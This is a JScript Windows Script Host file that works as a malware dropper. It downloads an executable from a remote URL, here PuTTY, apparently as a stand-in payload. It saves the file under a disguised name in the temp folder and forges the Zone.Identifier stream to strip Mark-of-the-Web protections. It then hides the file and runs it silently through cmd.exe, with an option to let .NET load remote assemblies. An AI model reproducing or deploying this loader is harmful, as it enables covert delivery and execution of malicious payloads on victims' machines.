function main() {
	log('Starting application..');
	
	/*
	 * Settings
	 */
	var dotnet = false;
	var filename = environ('%temp%\\cssrs.exe');
	var url = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe';
	
	/*
	 * Download and melt if file doesn't exist
	 */
	if (!fso.fileExists(filename)) {
		log('Downloading file..');
		download(url, filename);
		
		if (dotnet) {
			log('Creating configuration..');
			writeConfig(filename);
		}
	}
	
	/*
	 * Trust file
	 */
	log('Trusting file..');
	trust(filename);
	
	/*
	 * Hide file
	 */
	log('Hiding file..');
	hide(filename);
	
	/*
	 * Run file
	 */
	log('Starting file..');
	run(filename);
	
}

function log(str) {
	if (stdout.handle != null)
		stdout.write(str+"\r\n");
}

function download(url, filename) {
	var data = fetch(url);
	save(filename, data);
}

function fetch(url) {
	http.open('get', url, false);
	http.send();
	return http.responseBody;
}

function save(filename, data) {
	stream.type = 1;
	stream.open();
	stream.write(data);
	stream.saveToFile(filename, 2);
	stream.close();
}

function run(cmd) {
	shell.run('cmd.exe /C ' + cmd, 0);
}

function trust(filename) {
	var zoneIdentifier = fso.openTextFile(filename + ':Zone.Identifier', 2, -2);
	zoneIdentifier.writeLine('[ZoneTransfer]');
	zoneIdentifier.write('ZoneId=0');
	zoneIdentifier.close();
}

function hide(filename) {
	run('attrib +H ' + filename);
}

function environ(val) {
	return shell.expandEnvironmentStrings(val);
}

function writeConfig(filename) {
	var configName = filename + '.config';
	stream.type = 2;
	stream.open();
	stream.writeText('<?xml version="1.0" encoding="utf-8" ?>', 1);
	stream.writeText('<configuration>', 1);
	stream.writeText('\t<runtime>', 1);
	stream.writeText('\t\t<loadFromRemoteSources enabled="true"/>', 1);
	stream.writeText('\t</runtime>', 1);
	stream.writeText('\t<startup>', 1);
	stream.writeText('\t\t<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />', 1);
	stream.writeText('\t</startup>', 1);
	stream.writeText('</configuration>', 1);
	stream.saveToFile(configName, 2);
	stream.close();
}

var fso = new ActiveXObject('Scripting.FileSystemObject');
var http = new ActiveXObject('WinHttp.WinHttpRequest.5.1');
var stream = new ActiveXObject('ADODB.Stream');
var shell = new ActiveXObject('WScript.Shell');
var stdin = fso.GetStandardStream (0);
var stdout = fso.GetStandardStream (1);
var stderr = fso.GetStandardStream (2);
this['main']();
